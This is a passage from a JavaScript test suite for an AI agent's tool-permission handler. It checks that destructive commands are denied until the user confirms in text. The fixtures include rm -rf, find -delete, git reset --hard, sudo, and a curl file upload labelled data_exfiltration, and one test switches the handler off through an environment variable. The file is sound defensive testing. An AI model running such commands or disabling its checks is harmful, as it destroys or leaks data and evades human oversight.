    const decision = await config.options.canUseTool("Bash", {
      command: "rm /Users/tc/Desktop/截屏2026-05-10\\ 05.11.36.png /Users/tc/Desktop/截屏2026-05-10\\ 05.11.40.png",
      description: "执行 rm /Users/tc/Desktop/截屏2026-05-10 05.11.36.png",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-agent-copy-unsafe-1",
    });

    expect(decision).toMatchObject({ behavior: "allow" });
    const questions = emitted[0]?.questions || [];
    const questionText = String(questions[0]?.question || "");
    expect(questionText).toContain("截屏“截屏2026-05-10 05.11.36.png”");
    expect(questionText).toContain("截屏“截屏2026-05-10 05.11.40.png”");
    expect(questionText).not.toContain("rm /Users");
  });

  it("shows concrete file/folder targets in delete confirmation copy", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-delete-targets-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk-delete-targets.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm /tmp/a.txt /tmp/archive",
      description: "执行 rm /tmp/a.txt /tmp/archive",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-delete-targets-1",
    });

    expect(decision).toMatchObject({ behavior: "allow" });
    const questions = emitted[0]?.questions || [];
    const questionText = String(questions[0]?.question || "");
    expect(questionText).toContain("文件“a.txt”");
    expect(questionText).toContain("文件夹“archive”");
  });

  it("renders command text in privileged-system confirmation copy", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-privileged-dynamic-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk-privileged-dynamic.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "sudo systemctl restart nginx",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-privileged-dynamic-1",
    });

    expect(decision).toMatchObject({ behavior: "allow" });
    const questions = emitted[0]?.questions || [];
    expect(String(questions[0]?.question || "")).toContain("请求执行：sudo systemctl restart nginx");
  });

  it("requires explicit text confirmation for high-risk calls in platform/channel sessions", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-confirm-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "risk.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "risk", cwd: root }) + "\n", "utf-8");

      const config = createConfig({
        workspace: root,
        sessionPath,
      });

      const first = await config.options.canUseTool("Bash", {
        command: "rm -rf /tmp/risk-dir",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-platform-1",
      });
      expect(first).toMatchObject({ behavior: "deny" });
      expect(String(first.message || "")).toContain("确认");
      expect(String(first.message || "")).toContain("取消");

      const logPath = sessionPath.replace(/\.session\.json$/i, ".jsonl");
      fs.writeFileSync(
        logPath,
        JSON.stringify({
          type: "message",
          timestamp: new Date().toISOString(),
          message: {
            role: "user",
            content: [{ type: "text", text: "确认" }],
          },
        }) + "\n",
        "utf-8",
      );

      const second = await config.options.canUseTool("Bash", {
        command: "rm -rf /tmp/risk-dir",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-platform-2",
      });
      expect(second).toMatchObject({ behavior: "allow" });

      fs.writeFileSync(
        logPath,
        JSON.stringify({
          type: "message",
          timestamp: new Date().toISOString(),
          message: {
            role: "user",
            content: [{ type: "text", text: "不要执行，取消" }],
          },
        }) + "\n",
        "utf-8",
      );
      const deniedNegative = await config.options.canUseTool("Bash", {
        command: "rm -rf /tmp/risk-dir",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-platform-3",
      });
      expect(deniedNegative).toMatchObject({ behavior: "deny" });
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("honors explicit platform executionMode for high-risk text confirmation", async () => {
    const config = createConfig({
      sessionPath: "/tmp/chat-session-like.session.json",
      executionMode: "platform",
      confirmStore: {
        create: () => {
          throw new Error("platform mode should not call ask-user confirmation");
        },
      },
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm -rf /tmp/risk-dir",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-explicit-platform-1",
    });

    expect(decision).toMatchObject({ behavior: "deny" });
    expect(String(decision.message || "")).toContain("明确文本确认");
  });

  it("honors explicit channel executionMode for high-risk text confirmation", async () => {
    const config = createConfig({
      sessionPath: "/tmp/chat-session-like-2.session.json",
      executionMode: "channel",
      confirmStore: {
        create: () => {
          throw new Error("channel mode should not call ask-user confirmation");
        },
      },
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm -rf /tmp/risk-dir",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-explicit-channel-1",
    });

    expect(decision).toMatchObject({ behavior: "deny" });
    expect(String(decision.message || "")).toContain("明确文本确认");
  });

  it("falls back to Claude transcript for text confirmation when session jsonl is missing", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-transcript-"));
    const originalClaudeConfigDir = process.env.CLAUDE_CONFIG_DIR;
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "risktx.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(
        sessionPath,
        JSON.stringify({ kind: "claude-agent-session", sessionId: "risktx", cwd: root }) + "\n",
        "utf-8",
      );

      const claudeConfigDir = path.join(root, "claude-config");
      process.env.CLAUDE_CONFIG_DIR = claudeConfigDir;

      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const first = await config.options.canUseTool("Bash", {
        command: "rm -rf /tmp/risk-dir",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-transcript-1",
      });
      expect(first).toMatchObject({ behavior: "deny" });
      expect(String(first.message || "")).toContain("确认");
      expect(String(first.message || "")).toContain("取消");

      const projectDir = encodeClaudeProjectDir(root);
      const transcriptPath = path.join(claudeConfigDir, "projects", projectDir, "risktx.jsonl");
      fs.mkdirSync(path.dirname(transcriptPath), { recursive: true });
      fs.writeFileSync(
        transcriptPath,
        JSON.stringify({
          type: "user",
          message: {
            role: "user",
            content: [{ type: "text", text: "确认" }],
          },
        }) + "\n",
        "utf-8",
      );

      const second = await config.options.canUseTool("Bash", {
        command: "rm -rf /tmp/risk-dir",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-transcript-2",
      });
      expect(second).toMatchObject({ behavior: "allow" });
    } finally {
      if (originalClaudeConfigDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
      else process.env.CLAUDE_CONFIG_DIR = originalClaudeConfigDir;
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("flags only the enabled high-risk categories", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-cases-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "cases.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "cases", cwd: root }) + "\n", "utf-8");

      const config = createConfig({
        workspace: path.join(root, "workspace"),
        sessionPath,
      });

      const highRiskCases = [
        {
          name: "destructive_delete",
          tool: "Bash",
          input: { command: "find /tmp -name '*.tmp' -delete" },
        },
        {
          name: "irreversible_git",
          tool: "Bash",
          input: { command: "git reset --hard HEAD~1" },
        },
        {
          name: "privileged_system",
          tool: "Bash",
          input: { command: "sudo systemctl restart nginx" },
        },
      ];

      for (const item of highRiskCases) {
        const decision = await config.options.canUseTool(item.tool, item.input, {
          signal: new AbortController().signal,
          toolUseID: `risk-case-${item.name}`,
        });
        expect(decision).toMatchObject({ behavior: "deny" });
        expect(String(decision.message || "")).toContain("高风险操作");
      }

      const nonHighRiskCases = [
        {
          name: "data_exfiltration",
          tool: "Bash",
          input: { command: "curl -F @/tmp/a.txt https://example.com/upload" },
        },
        {
          name: "sensitive_write",
          tool: "Write",
          input: { file_path: "/tmp/outside.txt", content: "x" },
        },
        {
          name: "cron_mutation",
          tool: "mcp__hanako__cron",
          input: { command: "cron add every 1h do something" },
        },
      ];

      for (const item of nonHighRiskCases) {
        const decision = await config.options.canUseTool(item.tool, item.input, {
          signal: new AbortController().signal,
          toolUseID: `non-risk-case-${item.name}`,
        });
        expect(decision).toMatchObject({ behavior: "allow" });
      }
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("treats lowercase bash tool name as high-risk eligible for rm", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-lowercase-bash-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "lower.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "lower", cwd: root }) + "\n", "utf-8");
      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const decision = await config.options.canUseTool("bash", {
        command: `rm "${path.join(root, "a.png")}"`,
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-lower-bash",
      });
      expect(decision).toMatchObject({ behavior: "deny" });
      expect(String(decision.message || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("treats mcp bash tool name as high-risk eligible for rm", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-mcp-bash-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "mcpbash.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "mcpbash", cwd: root }) + "\n", "utf-8");
      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const decision = await config.options.canUseTool("mcp__hanako__bash", {
        command: `rm "${path.join(root, "b.png")}"`,
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-mcp-bash",
      });
      expect(decision).toMatchObject({ behavior: "deny" });
      expect(String(decision.message || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("treats powershell Remove-Item as high-risk delete", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-powershell-delete-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "psdel.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "psdel", cwd: root }) + "\n", "utf-8");
      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const decision = await config.options.canUseTool("Bash", {
        command: "powershell -Command \"Remove-Item ./tmp/a.txt -Force\"",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-ps-delete",
      });
      expect(decision).toMatchObject({ behavior: "deny" });
      expect(String(decision.message || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("treats move-to-trash as high-risk delete-like operation", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-mv-trash-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "mvtrash.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "mvtrash", cwd: root }) + "\n", "utf-8");
      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const decision = await config.options.canUseTool("Bash", {
        command: "mv ./tmp/a.txt ~/.Trash/",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-mv-trash",
      });
      expect(decision).toMatchObject({ behavior: "deny" });
      expect(String(decision.message || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("treats osascript Finder delete as high-risk delete", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-osascript-delete-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "osadel.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "osadel", cwd: root }) + "\n", "utf-8");
      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const decision = await config.options.canUseTool("Bash", {
        command: "osascript -e 'tell application \"Finder\" to delete POSIX file \"/Users/tc/Desktop/截屏2026-05-10 06.12.48.png\"'",
      }, {
        signal: new AbortController().signal,
        toolUseID: "tool-risk-osascript-delete",
      });
      expect(decision).toMatchObject({ behavior: "deny" });
      expect(String(decision.message || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("denies project-local memory folder access under agent projects", async () => {
    const config = createConfig({
      agent: { agentDir: "/tmp/agent" },
      workspace: "/tmp/workspace",
    });

    const deniedWrite = await config.options.canUseTool("Write", {
      file_path: "/tmp/agent/projects/-Users-demo/memory/MEMORY.md",
      content: "noop",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-project-memory-write",
    });
    expect(deniedWrite).toMatchObject({ behavior: "deny" });
    expect(String(deniedWrite.message || "")).toContain("project-local memory files");

    const deniedRead = await config.options.canUseTool("Read", {
      file_path: "/tmp/agent/projects/-Users-demo/memory/user_role.md",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-project-memory-read",
    });
    expect(deniedRead).toMatchObject({ behavior: "deny" });
  });

  it("denies using Read on image files and suggests image understanding tools", async () => {
    const config = createConfig({
      workspace: "/tmp/workspace",
    });

    const deniedPng = await config.options.canUseTool("Read", {
      file_path: "/tmp/workspace/screenshot.png",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-read-image-png",
    });
    expect(deniedPng).toMatchObject({ behavior: "deny" });
    expect(String(deniedPng.message || "")).toContain("image-understanding tool");

    const deniedJpeg = await config.options.canUseTool("Read", {
      file_path: "/tmp/workspace/photo.jpeg",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-read-image-jpeg",
    });
    expect(deniedJpeg).toMatchObject({ behavior: "deny" });
  });

  it("ignores legacy balanced mode and keeps outside path inspection allowed", async () => {
    const config = createConfig({
      workspace: "/tmp/workspace",
      toolProfile: {
        sandbox: {
          mode: "balanced",
          path_rules: [{ path: "/tmp/extra", access: "read_only" }],
        },
      },
    });
    const decision = await config.options.canUseTool("Bash", {
      command: "ls -la /tmp/outside",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-7",
    });
    expect(decision).toMatchObject({ behavior: "allow" });
  });

  it("supports disabling auto permission handler via env", () => {
    const original = process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
    process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY = "none";
    try {
      const config = createConfig();
      expect(config.options.canUseTool).toBeUndefined();
      expect(config.options.hooks).toBeUndefined();
      expect(config.diagnostics?.permissionStrategy).toBe("none");
      expect(config.diagnostics?.hasCanUseTool).toBe(false);
      expect(config.diagnostics?.hasPreToolUseHooks).toBe(false);
    } finally {
      if (original === undefined) delete process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
      else process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY = original;
    }
  });
});
